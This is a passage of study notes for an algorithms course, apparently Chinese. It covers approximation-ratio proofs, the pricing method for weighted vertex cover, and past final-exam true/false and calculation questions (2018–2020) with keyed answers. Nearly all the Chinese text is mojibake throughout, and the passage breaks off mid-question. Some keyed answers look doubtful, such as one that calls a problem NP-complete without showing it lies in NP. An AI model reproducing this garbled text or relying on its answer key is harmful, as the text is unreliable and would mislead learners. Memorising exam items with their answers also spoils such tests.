æ‰€ç»™ç®—æ³•åŸºç¡€ä¸Šå¯¹é›†åˆ A è¿›è¡Œé™åºå½’å¹¶æ’åº[O(nlogn)]\n\nå³ï¼š a<sub>1</sub>ï¼a<sub>2</sub>ï¼a<sub>3</sub>ï¼â€¦ï¼a<sub>k</sub>ï¼a<sub>k+1</sub>ï¼...ï¼a<sub>n</sub>\n\nè¯æ˜ï¼šè®¾ a<sub>k</sub> ä¸ºå¯è¡Œé›†æœ€åä¸€ä¸ªå…ƒç´ \n\na<sub>kÂ </sub>â‰¥ a<sub>k+1Â </sub>â‡’ âˆ‘S â‰¥ a<sub>k+1 </sub>   ------â‘ \n\na<sub>k</sub> ä¸ºå¯è¡Œé›†æœ€åä¸€ä¸ªå…ƒç´  â‡’ âˆ‘S â‰¥ b - a<sub>k+1 </sub>------â‘¡\n\nâ‘ +â‘¡ ï¼š âˆ‘S â‰¥ (1/2)b ï¼Œå†åˆ b â‰¥ âˆ‘S*\n\nâ‡’âˆ‘S â‰¥ (1/2)âˆ‘S*\n\nâˆ´ è¯¥ç®—æ³•æ˜¯ 1/2 å€è¿‘ä¼¼ç®—æ³•\n\n------\n\n#### âé¢˜ç›®2\n\n(2018)å™è¿°å¸¦æƒé‡çš„ç‚¹è¦†ç›–é—®é¢˜çš„ç«ä»·æ³•ï¼ˆPricing methodï¼‰çš„æ­¥éª¤ã€‚\n\nç­”ï¼šä»»é€‰ä¸€æ¡è¾¹ (i, j) åŠ ä¸Šä»£ä»·ï¼Œè¿™ä¸ªä»£ä»·ä»é›¶å¼€å§‹ï¼Œä¸”è¿™ä¸ªä»£ä»·çš„æœ€å¤§å€¼å°äº i å’Œ j èŠ‚ç‚¹çš„æƒå€¼ã€‚æ˜¾ç„¶ï¼Œè¿™ä¸ªè¾¹æƒå€¼çš„æœ€å¤§å€¼å–å†³äºä¸¤ä¸ªç«¯ç‚¹æƒå€¼çš„æœ€å°å€¼ï¼Œæˆ‘ä»¬è®¤ä¸ºå½“è¾¹æƒå€¼ä¸ç‚¹æƒå€¼ç›¸ç­‰æ—¶ï¼Œå¯¹åº”çš„é‚£ä¸ªç‚¹æ˜¯ç´§çš„ã€‚æŠŠæ‰€æœ‰ç´§çš„ç‚¹æ‰¾å‡ºæ¥å³ä¸ºé¡¶ç‚¹è¦†ç›–ã€‚\n\n#### â‚é¢˜ç›®3\n\n(2019)ç®€å•è¯æ˜å®šä»·ç®—æ³•ï¼ˆPricing methodï¼‰æ±‚è§£å¸¦æƒé‡çš„ç‚¹è¦†ç›–ï¼ˆWeighted Vertex Coverï¼‰é—®é¢˜æ˜¯2å€è¿‘ä¼¼çš„ã€‚\n\nç­”ï¼š S ä¸ºç®—æ³•ç»ˆæ­¢æ—¶æ‰€æœ‰ç´§èŠ‚ç‚¹çš„é›†åˆã€‚æ˜“å¾— S æ˜¯é¡¶ç‚¹è¦†ç›–ï¼ˆåè¯ï¼šå¦‚æœæŸæ¡è¾¹æ²¡æœ‰è¢«è¦†ç›–åˆ°ï¼Œåˆ™å…¶ä¸¤ä¸ªç«¯ç‚¹éƒ½æ²¡æœ‰è¦†ç›–å¾ˆç´§ï¼Œç®—æ³•ä¸ä¼šç»ˆæ­¢ï¼‰\n\nw(S) ç­‰äºæ‰€é€‰çš„èŠ‚ç‚¹çš„æƒå€¼ä¹‹å’Œï¼Œç­‰äºæ‰€é€‰èŠ‚ç‚¹æ‰€å¯¹åº”çš„è¾¹æƒä¹‹å’Œï¼Œå¯ä»¥æŠŠå®ƒæ”¾å¤§åˆ°æ‰€æœ‰èŠ‚ç‚¹å¯¹åº”è¾¹æƒä¹‹å’Œï¼Œè¿™æ ·å› ä¸ºä¸€æ¡è¾¹ (u, v) åœ¨ u ä¸Šç®—è¿‡ä¸€æ¬¡åè¿˜è¦åœ¨ v ä¸Šç®—ä¸€æ¬¡ï¼Œæ‰€ä»¥ç­‰äºè¾¹æƒå’Œçš„ä¸¤å€ã€‚å†ç”±ä¸Šé¢å…¬å¹³å¼•ç†å¯å¾—ã€‚\n\n![](https://img.jwt1399.top/img/202111131352401.png)\n\nâˆ´ å®šä»·ç®—æ³•æ˜¯2å€è¿‘ä¼¼ç®—æ³•\n\n#### âƒé¢˜ç›®4\n\nä¸ºæœ€å¤§ç‹¬ç«‹é›†é—®é¢˜å»ºç«‹ä¸€ä¸ªæ•´æ•°è§„åˆ’æ¨¡å‹ã€‚    ï¼ˆ5åˆ†ï¼‰\n\n å‚è€ƒç­”æ¡ˆï¼š\n ç›®æ ‡å‡½æ•°ï¼š max  âˆ‘ x<sub>i</sub>              \t\t\t\tï¼ˆ2åˆ†ï¼‰\n æ¡ä»¶ï¼šå¯¹æ¯ä¸€æ¡è¾¹(i,j)ï¼Œ  x<sub>i</sub> + x<sub>j</sub>  â‰¤ 1         ï¼ˆ2åˆ†)\n    \t\t    å¯¹æ¯ä¸ªé¡¶ç‚¹iï¼Œ x<sub>i</sub>  = 0,1\t\t\t\tï¼ˆ1åˆ†)\n\n\n\n## â‘¨å†å¹´æœŸæœ«çœŸé¢˜\n\n>é¢˜ç›®æ¥æºäºè¯¾å ‚ï¼Œç”±å°ç®€æ‹ä¸‹æ¥ï¼Œæ‰‹å·¥æ•´ç†ï¼Œå› æ­¤æˆ–å¤šæˆ–å°‘å­˜åœ¨ä¸€äº›é”™è¯¯ï¼Œæœ›è°…è§£ï¼\n\n### â¶é€‰æ‹©é¢˜\n\n#### æ ·é¢˜\n\nä¸€ã€åˆ¤æ–­ä¸‹åˆ—é™ˆè¿°çš„å¯¹é”™ï¼ˆå…±20åˆ†ï¼Œå…± 10é¢˜ï¼Œæ¯é¢˜2åˆ†ï¼‰\n\n1. ä¸€ä¸ªè®¡ç®—é—®é¢˜çš„è¾“å…¥æ˜¯nä¸ªæ•°å­—a<sub>1</sub>ï¼Œa<sub>2</sub>ï¼Œâ€¦ï¼Œa<sub>n</sub>ã€‚å¦‚æœè¿™ä¸ªé—®é¢˜å­˜åœ¨ä¸€ä¸ªè¿è¡Œæ—¶é—´ä¸ºO(a<sub>n</sub>n<sup>10</sup>)çš„ç®—æ³•ï¼Œåˆ™è¿™ä¸ªé—®é¢˜å¯ä»¥åœ¨å¤šé¡¹æ—¶é—´å†…è¢«è®¡ç®—æœºæ±‚è§£ã€‚ `(F)`\n2. å¦‚æœå­˜åœ¨ä¸€ä¸ªä»é—®é¢˜Aåˆ°é—®é¢˜Bçš„å¤šé¡¹å¼æ—¶é—´å½’çº¦ï¼ˆPolynomial reductionï¼‰ï¼Œä¸”é—®é¢˜Aæ˜¯NPéš¾çš„ï¼Œåˆ™å¯çŸ¥é—®é¢˜Bä¹Ÿæ˜¯NPéš¾çš„ã€‚ `(T)`\n3. ä¸€ä¸ª2å€çš„è¿‘ä¼¼ç®—æ³•ä¸€å®šä¼šæœ‰åœ¨ä¸€ä¸ªé—®é¢˜ä¸Šå¾—åˆ°æ­£å¥½æ˜¯æœ€ä¼˜è§£çš„ä¸¤å€çš„è§£ã€‚`(F)`                                                     \n4. å¦‚æœå­˜åœ¨ä¸€ä¸ªNPé—®é¢˜æœ‰å¤šé¡¹å¼æ—¶é—´ç®—æ³•ï¼Œåˆ™P=NPã€‚`(F)`\n5. ä¸€ä¸ªå›¾ä¸Šçš„æœ€å¤§ç½‘ç»œæµæ˜¯å”¯ä¸€çš„ã€‚ `(F)`\n6. å½“å›¾ä¸­çš„é¡¶ç‚¹ä¸ªæ•°æ˜¯å¸¸æ•°æ—¶ï¼Œæœ€å¤§ç‹¬ç«‹é›†é—®é¢˜ï¼ˆMaximum Independent Set Problemï¼‰æ˜¯å¤šé¡¹å¼æ—¶é—´å¯è§£çš„.  `(T)`\n7. è¿™é‡Œæœ‰ä¸¤ä¸ªè§£å†³æ’åºé—®é¢˜çš„åˆ†è€Œæ²»ä¹‹ç®—æ³•ï¼šç®—æ³•Aé€’å½’å°†éœ€è¦æ’åˆ—çš„æ•°å­—å‡åˆ†æˆ2ä»½ï¼Œåˆ†åˆ«æ’åºåå†åˆå¹¶ã€‚ç®—æ³•Bé€’å½’å°†éœ€è¦æ’åˆ—çš„æ•°å­—å‡åˆ†æˆ3ä»½ï¼Œåˆ†åˆ«æ’åºåå†åˆå¹¶ã€‚ä»æ¸è¿›åˆ†æçš„è§’åº¦æ¥çœ‹ï¼Œç®—æ³•Bæ¯”ç®—æ³•Aè¦å¿«ã€‚`(F)`\n8. åœ¨å¹¶è¡Œè®¡ç®—ä¸­ï¼Œä¸€ä¸ªè®¡ç®—é—®é¢˜èƒ½åœ¨CREW PRAMæ¨¡å‹ä¸‹O(n)å¤„ç†å™¨O(n<sup>3</sup>)æ—¶é—´è¢«è§£å†³ï¼Œåˆ™ä¹Ÿå¯ä»¥åœ¨EREW PRAMæ¨¡å‹ä¸‹O(n)å¤„ç†å™¨O(n<sup>3</sup>)æ—¶é—´è¢«è§£å†³.`(T)`\n9. å¯¹äºä»»æ„ä¸€ä¸ªåŠ¨æ€è§„åˆ’ç®—æ³•ï¼Œå…¶ä½¿ç”¨çš„ç©ºé—´ä¸€å®šä¸æ¯”å®ƒä½¿ç”¨çš„æ—¶é—´è¦å¤§ã€‚`(T)`\n10. æ±‚ä¸€ä¸ªå›¾ä¸­ä¸¤ä¸ªç‚¹é—´æœ€é•¿è·¯å¾„çš„é—®é¢˜æ˜¯å±äºNPçš„ï¼Œä½†æ˜¯æ±‚ä¸€ä¸ªå›¾ä¸­ä¸¤ä¸ªç‚¹é—´æœ€çŸ­è·¯å¾„çš„é—®é¢˜åˆ™ä¸æ˜¯å±äºNPçš„ã€‚`(F)`\n\n#### 2018\n\nä¸€ã€åˆ¤æ–­ä¸‹åˆ—é™ˆè¿°çš„å¯¹é”™ï¼ˆå…±30åˆ†ï¼Œå…± 15é¢˜ï¼Œæ¯é¢˜2åˆ†ï¼‰\n\n1. ä»»ä½•ä¸€ä¸ªNPé—®é¢˜èƒ½è¢«å¤šé¡¹å¼æ—¶é—´ç®—æ³•è§£å†³åˆ™æ‰€æœ‰NPé—®é¢˜éƒ½èƒ½åœ¨å¤šé¡¹å¼æ—¶é—´å†…è¢«è§£å†³ã€‚`ï¼ˆFï¼‰`\n2. å¯ä»¥ç”¨å¦‚ä¸‹æ–¹æ³•æ¥è¯æ˜æŸç»“è®ºXæˆç«‹ï¼šå…ˆå‡è®¾Xä¸æˆç«‹ï¼Œåœ¨æ­¤å‡è®¾åŸºç¡€ä¸Šæ¨å¯¼å‡ºXæˆç«‹ï¼Œåˆ™å¯ä»¥è¯æ˜Xæˆç«‹ã€‚`ï¼ˆTï¼‰`                      \n3. ä¸€ä¸ª2å€è¿‘ä¼¼ç®—æ³•å¾—åˆ°çš„è§£æ€»æ¯”ä¸€ä¸ª4å€è¿‘ä¼¼ç®—æ³•å¾—åˆ°çš„è§£æ›´å¥½ã€‚`ï¼ˆFï¼‰`\n4. é—®ä¸€ä¸ªå›¾æ˜¯å¦å­˜åœ¨ä¸€ä¸ªå¤§å°ä¸ºkçš„ç‚¹è¦†ç›–ï¼Œå¾ˆå®¹æ˜“è¯æ˜è¯¥é—®é¢˜æ˜¯å±äºNPçš„ï¼›ä½†æ˜¯ï¼Œé—®ä¸€ä¸ªå›¾æ˜¯å¦ä¸å­˜åœ¨ä¸€ä¸ªå¤§å°ä¸ºkçš„ç‚¹è¦†ç›–ï¼Œå´æ˜¯å¾ˆéš¾è¯æ˜è¿™ä¸ªé—®é¢˜æ˜¯å¦å±äºNPã€‚ `(T)`\n5. ä¸€ä¸ªé—®é¢˜Aå¯ä»¥å¤šé¡¹å¼æ—¶é—´è§„çº¦åˆ°ä¸€ä¸ªNPå®Œå…¨é—®é¢˜Bï¼Œé‚£ä¹ˆé—®é¢˜Aå¯èƒ½å±äºPä¹Ÿå¯èƒ½å±äºNPå®Œå…¨ã€‚`(T)`                                    \n6. ä¸€ä¸ª3å€è¿‘ä¼¼ç®—æ³•å¦‚æœå¯¹ä»»ä½•é—®é¢˜å®ä¾‹æ‰¾åˆ°çš„è§£éƒ½åœ¨æœ€ä¼˜è§£çš„1.5å€ä»¥å†…ï¼Œåˆ™è¿™ä¸æ˜¯ä¸€ä¸ª3å€è¿‘ä¼¼ç‡çš„ç®—æ³•ã€‚`ï¼ˆFï¼‰`                        \n7. å¯¹æŸä¸ªé—®é¢˜ä»¥å‰æœ€å¥½çš„ç®—æ³•è¿è¡Œæ—¶é—´ä¸ºO(n<sup>3</sup>)ï¼Œæ–°ç»™å‡ºçš„ç®—æ³•è¿è¡Œæ—¶é—´ä¸ºO(n<sup>2</sup>)ã€‚é‚£ä¹ˆåœ¨è¯¥é—®é¢˜ä¸Šè¿è¡Œæ—¶é—´æ”¹è¿›äº†O(n)ã€‚`(F)`\n8. å¯¹äºåˆ¤æ–­ä¸€ä¸ªæ•´æ•°wæ˜¯ä¸æ˜¯ç´ æ•°çš„é—®é¢˜ï¼Œä¸€ä¸ªè¿è¡Œæ—¶é—´ä¸ºO(w<sup>2</sup>)çš„ç®—æ³•æ˜¯å¤šé¡¹å¼æ—¶é—´ç®—æ³•ï¼Œè€Œä¸€ä¸ªè¿è¡Œæ—¶é—´ä¸ºO(2<sup>w</sup>)çš„ç®—æ³•æ˜¯æŒ‡æ•°æ—¶é—´ç®—æ³•ã€‚`(F)`\t\n9. è¯æ˜ä¸€ä¸ªç®—æ³•ä¸æ˜¯2å€è¿‘ä¼¼ç®—æ³•åªéœ€è¦æ„é€ ä¸€ä¸ªä¾‹å­ä½¿å¾—åœ¨è¯¥ä¾‹å­ä¸Šè¿”å›çš„è§£è¶…è¿‡2å€æœ€ä¼˜è§£å³å¯ã€‚`(T)`                                     \n10. å¦‚æœä¸€ä¸ªå›¾ä¸Šä¸¤ç‚¹é—´çš„æœ€å¤§æµæ˜¯å”¯ä¸€çš„ï¼Œåˆ™å¯ä»¥ç¡®å®šè¿™ä¸¤ç‚¹é—´çš„æœ€å°å‰²ä¹Ÿå”¯ä¸€ã€‚ `(F)`                                                     \n11. è¯æ˜æŠŠé—®é¢˜Aè§„çº¦åˆ°äº†é—®é¢˜Bï¼Œåªéœ€è¦è¯æ˜å¯¹äºä»»æ„é—®é¢˜Açš„å®ä¾‹ I éƒ½å¯ä»¥æ„é€ ä¸€ä¸ªé—®é¢˜Bçš„å®ä¾‹ I' ä½¿å¾—å®ä¾‹ I' çš„ä»»æ„è§£å¯ä»¥æ„é€ å‡ºå®ä¾‹ I çš„ä¸€ä¸ªè§£ã€‚`ï¼ˆFï¼‰`\n12. åŠ¨æ€è§„åˆ’ç®—æ³•æœ‰å¯èƒ½æ˜¯å¤šé¡¹å¼æ—¶é—´çš„ä¹Ÿæœ‰å¯èƒ½æ˜¯æŒ‡æ•°æ—¶é—´çš„ã€‚`ï¼ˆTï¼‰`\n13. ä¸€ä¸ªäºŒåˆ†å›¾å¦‚æœåŒ…å«å¥‡æ•°ä¸ªé¡¶ç‚¹ï¼Œåˆ™è¿™ä¸ªå›¾ä¸€å®šä¸å­˜åœ¨ä¸€ä¸ªå“ˆå¯†å°”é¡¿åœˆã€‚`ï¼ˆTï¼‰`\n14. ä¸å±äºNPä¸­çš„é—®é¢˜ä¸€å®šä¸å­˜åœ¨å¤šé¡¹å¼æ—¶é—´ç®—æ³•ã€‚`ï¼ˆFï¼‰`\n15. å¯¹äºæ¯ç§’å¯ä»¥å¤„ç†100ä¸‡æ¡åŸºæœ¬æŒ‡ä»¤çš„è®¡ç®—æœºï¼Œä¸€ä¸ªè¿è¡Œæ—¶é—´ä¸º 1.5<sup>n</sup> çš„ç®—æ³•åœ¨ n=100 çš„ä¾‹å­ä¸Šå¯ä»¥1å¹´å†…è®¡ç®—å®Œã€‚`(F)`       \n\n#### 2019\n\nä¸€ã€åˆ¤æ–­ä¸‹åˆ—é™ˆè¿°çš„å¯¹é”™ï¼ˆå…±20åˆ†ï¼Œå…± 10é¢˜ï¼Œæ¯é¢˜2åˆ†ï¼‰\n\n1. åœ¨èƒŒåŒ…é—®é¢˜ä¸­ï¼Œå¦‚æœè§„å®šæ‰€æœ‰è¾“å…¥çš„æ•°å€¼(åŒ…æ‹¬èƒŒåŒ…çš„å¤§å°å’Œå„ä¸ªç‰©å“çš„ä»·å€¼å’Œä½“ç§¯)éƒ½æ˜¯é•¿æ•´å‹æ•°æ®ï¼Œåˆ™åŠ¨æ€è§„åˆ’ç®—æ³•å¯ä»¥åœ¨å¤šé¡¹å¼å†…æ±‚è§£ã€‚`(T)`\n2. NPé—®é¢˜æ˜¯ç›®å‰æ²¡æœ‰æ‰¾åˆ°å¤šé¡¹å¼æ—¶é—´æ±‚è§£ç®—æ³•çš„åˆ¤å®šé—®é¢˜é›†åˆã€‚`(F)`\n   - NPé—®é¢˜æ˜¯æ‰€æœ‰å¯ç”¨å¤šé¡¹å¼æ—¶é—´ç®—æ³•éªŒè¯å…¶çŒœæµ‹å‡†ç¡®æ€§çš„é—®é¢˜çš„é›†åˆã€‚ \n3. çº¿æ€§è§„åˆ’é—®é¢˜å¯ä»¥å¤šé¡¹å¼æ±‚è§£ï¼Œä½†æ˜¯æ•´æ•°è§„åˆ’é—®é¢˜æ˜¯NP-hardé—®é¢˜ã€‚`(T)`\n   - æ•´æ•°è§„åˆ’æ˜¯NPCï¼ŒNPC âŠ† NP-hard\n4. æ‰¾å‡ºä¸€ä¸ªå›¾çš„å“ˆå¯†å°”é¡¿åœˆå’Œåˆ¤å®šè¯¥å›¾æ˜¯å¦å­˜åœ¨å“ˆå¯†å°”é¡¿åœˆï¼Œè¿™ä¸¤ä¸ªé—®é¢˜åœ¨ä¸è€ƒè™‘å¤šé¡¹å¼æ—¶é—´çš„å·®å¼‚åŸºç¡€ä¸Šè®¡ç®—éš¾åº¦æ˜¯ç›¸å½“çš„ã€‚`(T)`\n5. ä¸€ä¸ªç½‘ç»œçš„æœ€å¤§æµçš„å€¼ä¸€å®šä¸å¤§äºä»»æ„ä¸€ä¸ªå‰²é›†çš„å®¹é‡ã€‚`(T)`\n   - ç½‘ç»œçš„æœ€å¤§æµåº”ç­‰äºæœ€å°å‰²é›†å®¹é‡ã€‚\n6. å¦‚æœæˆ‘ä»¬ä¸èƒ½åœ¨ä¸€ä¸ªæµç½‘ç»œä¸­æ‰¾åˆ°ä¸€æ¡ä»Såˆ°Tçš„è·¯å¾„ï¼Œä½¿å¾—è·¯å¾„ä¸Šæ‰€æœ‰è¾¹çš„æµé‡éƒ½å°äºè¯¥è¾¹çš„å®¹é‡ï¼Œåˆ™æˆ‘ä»¬å¾—åˆ°äº†è¯¥ç½‘ç»œä¸ŠSåˆ°Tçš„æœ€å¤§æµã€‚`(F)`\n7. è¯æ˜ä¸€ä¸ªç®—æ³•ä¸èƒ½è¾¾åˆ°2å€è¿‘ä¼¼è§£åªéœ€è¦æ‰¾åˆ°ä¸€ä¸ªä¾‹å­åœ¨è¯¥ä¾‹å­ä¸Šå¾—åˆ°çš„è§£è¦å·®äº2å€æœ€ä¼˜è§£å³å¯ã€‚åä¹‹ï¼Œæ— è®ºç»™å‡ºå¤šå°‘ä¸ªä¾‹å­åœ¨è¿™äº›ä¾‹å­ä¸Šéƒ½èƒ½å¾—åˆ°ä¼˜äº2å€æœ€ä¼˜è§£çš„è§£ä¹Ÿä¸èƒ½è¯´æ˜è¿™ä¸ªç®—æ³•æ‹¥æœ‰2å€è¿‘ä¼¼ç‡ã€‚`(T)`\n8. å¦‚æœä¸€ä¸ªé—®é¢˜Aå­˜åœ¨å¤šé¡¹å¼ç®—æ³•å¯ä»¥æ¨å¯¼å‡ºæ‰€æœ‰NPé‡Œçš„é—®é¢˜éƒ½å­˜åœ¨å¤šé¡¹å¼ç®—æ³•ï¼Œé‚£ä¹ˆå¯çŸ¥é—®é¢˜Aæ˜¯NPå®Œå…¨çš„`(T)`\n9. é—®ä¸€ä¸ªæ•°æ˜¯ä¸æ˜¯ä¸ªåˆæ•°ï¼Œå¾ˆå®¹æ˜“è¯æ˜è¯¥é—®é¢˜æ˜¯å±äºNPçš„:ä½†æ˜¯é—®ä¸€ä¸ªæ•°æ˜¯ä¸æ˜¯ç´ æ•°ï¼Œè¿™ä¸ªé—®é¢˜å´æ˜¯å¾ˆéš¾è¯æ˜æ˜¯å¦å±äºNPçš„ã€‚`(F)`\n   - éƒ½æ˜¯ NP\n10. å› ä¸ºåˆ¤æ–­ä¸€ä¸ªå›¾æ˜¯å¦å­˜åœ¨å“ˆå¯†å°”é¡¿åœˆé—®é¢˜æ˜¯å±äºNPçš„ï¼Œæ‰€ä»¥åˆ¤æ–­ä¸€ä¸ªå›¾æ˜¯å¦ä¸å­˜åœ¨å“ˆå¯†å°”é¡¿åœˆé—®é¢˜ä¹Ÿæ˜¯å±äºNPçš„ã€‚`(F)`\n    - ä¸å­˜åœ¨æ˜¯ Co-NP\n\n#### 2020\n\nä¸€ã€å‘½é¢˜æ­£ç¡®å¡«Tï¼Œå‘½é¢˜é”™è¯¯å¡«Fï¼ˆ2åˆ†é¢˜x10é¢˜=20åˆ†ï¼‰\n\n1. å¦‚æœf(n) = O(g(n))ï¼Œåˆ™æœ‰log<sub>2</sub>f(n) = O(log<sub>2</sub>g(n))ã€‚`(T)`\n2. ä¸€ä¸ªPç±»é—®é¢˜å¯ä»¥å¤šé¡¹å¼æ—¶é—´å½’çº¦åˆ°ä»»æ„ä¸€ä¸ªNPå®Œå…¨é—®é¢˜ã€‚`(T)`\n3. æ–æ³¢é‚£å¥‘æ•°åˆ—å®šä¹‰f(1)=f(2)=1ï¼Œå½“nâ‰¥3æ—¶ï¼Œf(n)=f(n-1)+f(n-2)ã€‚æ±‚è§£è¯¥æ•°åˆ—ç¬¬nä¸ªæ•°f(n)çš„è‡ªé¡¶å‘ä¸‹çš„åˆ†æ²»é€’å½’ç®—æ³•æ˜¯æŒ‡æ•°æ—¶é—´ç®—æ³•ï¼Œæ±‚è§£è¯¥æ•°åˆ—ç¬¬nä¸ªæ•°f(n)çš„è‡ªåº•å‘ä¸Šçš„åŠ¨æ€è§„åˆ’ç®—æ³•ä¹Ÿæ˜¯æŒ‡æ•°æ—¶é—´ç®—æ³•ã€‚`(T)`\n   - è€ƒè™‘è¾“å…¥è§„æ¨¡\n4. ç»™å®šè¾¹ä¸Šå®¹é‡å‡ä¸ºæ­£æ•´æ•°çš„æµç½‘ç»œï¼Œç½‘ç»œæµ f çš„ âˆ† å‰©ä½™ç½‘ç»œ G<sub>f</sub>(âˆ†) ä¸­ä¸å­˜åœ¨ä»æºç‚¹ s åˆ°ç»ˆç‚¹ t çš„æœ‰å‘è·¯å¾„ï¼Œå¦‚æœ âˆ† = 1 åˆ™ f æ˜¯è¯¥ç½‘ç»œçš„æœ€å¤§æµã€‚`(T)`\n5. ç»™å®šæ±‚è§£è´Ÿè½½å‡è¡¡é—®é¢˜çš„ 2 å€è¿‘ä¼¼ç®—æ³• A å’Œ 3/2 å€è¿‘ä¼¼ç®—æ³• Bï¼Œå¯¹äºè¯¥é—®é¢˜çš„ä»»æ„å®ä¾‹ï¼Œç®—æ³• B å¾—åˆ°çš„è¿‘ä¼¼è§£éƒ½æ¯”ç®—æ³• A å¾—åˆ°çš„è¿‘ä¼¼è§£æ›´æ¥è¿‘æœ€ä¼˜è§£ã€‚`(F)`\n6. ç»™å®šå¸¦æƒé‡çš„é¡¶ç‚¹è¦†ç›–é—®é¢˜ï¼Œåˆ©ç”¨æ•´æ•°è§„åˆ’æ¨¡å‹æ±‚å¾—çš„é¡¶ç‚¹è¦†ç›–çš„æœ€å°æƒé‡ä¹‹å’Œä¸º x ï¼Œåˆ©ç”¨æ¾é©°åŒ–çš„çº¿æ€§è§„åˆ’æ¨¡å‹æ±‚å¾—çš„é¡¶ç‚¹è¦†ç›–çš„æœ€å°æƒé‡ä¹‹å’Œä¸º yï¼Œåˆ™æ€»æœ‰xâ‰¤yã€‚`(F)`\n7. åˆ¤æ–­ç»™å®šç®€å•æ— å‘å›¾ä¸­æ˜¯å¦ä¸å­˜åœ¨å“ˆå¯†å°”é¡¿åœˆæ˜¯ NP å®Œå…¨é—®é¢˜ã€‚`(F)`\n   - co-NP\n8. ç»™å®šä¸¤ä¸ªåˆ¤å®šé—®é¢˜ A å’Œ B ï¼Œå¦‚æœ A â‰¤<sub>p</sub> Bï¼ŒB â‰¤<sub>p</sub> Aï¼Œå¹¶ä¸” A âˆˆ NPCï¼Œé‚£ä¹ˆ B âˆˆ NPCã€‚`(F)`\n   - A æ˜¯å¦æ˜¯ NP\n9. å¦‚æœåˆ¤æ–­é—®é¢˜ A å­˜åœ¨å¤šé¡¹å¼æ—¶é—´çš„æ±‚è§£ç®—æ³•ï¼Œé‚£ä¹ˆé—®é¢˜ A æ˜¯ P é—®é¡Œï¼Œä¸æ˜¯NPé—®é¢˜ã€‚`(F)`\n   - æ˜¯ P è‚¯å®šæ˜¯ NP\n10. ç»™å®šä¸¤ä¸ªåˆ¤å®šé—®é¢˜ A å’Œ Bï¼ŒA â‰¤<sub>p</sub> B çš„æ„æ€æ˜¯è¯´ï¼Œå¯ä»¥é€šè¿‡å¤šé¡¹å¼æ¬¡çš„è°ƒç”¨æ±‚è§£é—®é¢˜ B çš„æ–¹æ³•æ¥æ±‚è§£é—®é¢˜ Aï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœé—®é¢˜ B å¯ä»¥å¤šé¡¹å¼æ—¶é—´æ±‚è§£ï¼Œåˆ™é—®é¢˜ A å¯ä»¥å¤šé¡¹å¼æ—¶é—´æ±‚è§£ã€‚`(T)`\n\n### â·è®¡ç®—é¢˜&ç®€å•é¢˜\n\n#### æ ·é¢˜\n\näºŒã€è®¡ç®—é¢˜ï¼ˆå…±9åˆ†ï¼Œå…±3é¢˜ï¼Œæ¯é¢˜3åˆ†ï¼‰\n1. æ±‚å¦‚ä¸‹æœ‰å‘å›¾ä¸­çš„ä¸€ä¸ªæœ€é•¿è·¯å¾„ï¼Œè¦æ±‚ç»™å‡ºè·¯å¾„å’Œè·¯å¾„é•¿åº¦çš„å€¼ã€‚\n\n   ![](https://img.jwt1399.top/img/image-20211124232947658.png)\n\nâ€‹\t\t\tå‚è€ƒç­”æ¡ˆï¼š CADBï¼Œé•¿åº¦ï¼š40+30+35=105\n\n------\n\n2. å¦‚ä¸‹å¯æ»¡è¶³é—®é¢˜ï¼ˆSATï¼‰æ˜¯å¦æœ‰è§£ï¼Œè‹¥æœ‰è§£è¯¥å¦‚ä½•ç»™å˜é‡èµ‹å€¼ï¼š![](https://img.jwt1399.top/img/image-20211124232912948.png)å‚è€ƒç­”æ¡ˆï¼šx1=1,x2=1,x3=0æˆ–è€…x1=0,x2=0,x3=0ï¼Œç­”æ¡ˆæ­£ç¡®å³å¯ç»™åˆ†ã€‚ï¼ˆè¯´æ˜ï¼šæœ¬é¢˜å­˜åœ¨å¤šç§è§£ï¼Œå¦‚x3=1, x1å’Œx2ä¸­æœ‰ä¸€ä¸ª0ï¼Œè¿™ç§æƒ…å†µè¿˜æ˜¯æœ‰è§£ã€‚åªè¦ä»»ç»™å‡ºä¸€ç§è§£å°±ç»™åˆ†)\n\n------\n\n3. æœ‰ä¸€äº›åŒºé—´æ®µ (0,3), (2,4), (3,6), (5,7), (1,4), (3,5), (6,8),(7,9)ï¼Œæ‰¾å‡ºå…¶ä¸­ä¸ªæ•°æœ€å¤šçš„ä¸€ç»„ç›¸å®¹çš„åŒºé—´æ®µï¼ˆä¸¤ä¸ªåŒºé—´ç›¸å®¹å½“ä¸”ä»…å½“ä¸¤ä¸ªåŒºé—´çš„äº¤é›†ä¸ºç©º)ã€‚\n\n   å‚è€ƒç­”æ¡ˆï¼šï¼ˆ0,3ï¼‰ï¼Œï¼ˆ3,5ï¼‰ï¼Œï¼ˆ5,7ï¼‰ï¼Œï¼ˆ7,9ï¼‰\n\n------\n\n#### 2018\n\näºŒã€è®¡ç®—é¢˜å’Œç®€ç­”é¢˜ï¼Œè®¡ç®—é¢˜å¯ä»¥åªå†™ç­”æ¡ˆä¸å†™è¿‡ç¨‹ï¼ˆå…±16åˆ†ï¼Œå…±4é¢˜ï¼Œæ¯é¢˜4åˆ†ï¼‰\n\n1. ä¸€ä¸ªæ•°çš„åºåˆ—ä¸­æ’åœ¨å‰é¢çš„æ•°æ¯”æ’åœ¨åé¢çš„æ•°è¦å¤§çš„è¯åˆ™ç§°ä¸ºä¸€å¯¹é€†åºã€‚é—®ä¸‹é¢è¿™ä¸ªåºåˆ—ä¸­å­˜åœ¨å¤šå°‘å¯¹é€†åºï¼š5ï¼Œ10ï¼Œ7ï¼Œ9ï¼Œ13ï¼Œ1ï¼Œ8ï¼Œ4ï¼Œ12ï¼Œ2ï¼Œ6ï¼Œ3ï¼Œ11ï¼Œ14ã€‚ï¼ˆ4åˆ†ï¼‰\n\n   ç­”ï¼š4+8+5+6+8+0+4+2+4+0+1+0+0=42\n\n------\n\n2. è´Ÿè½½å‡è¡¡ï¼ˆLoad 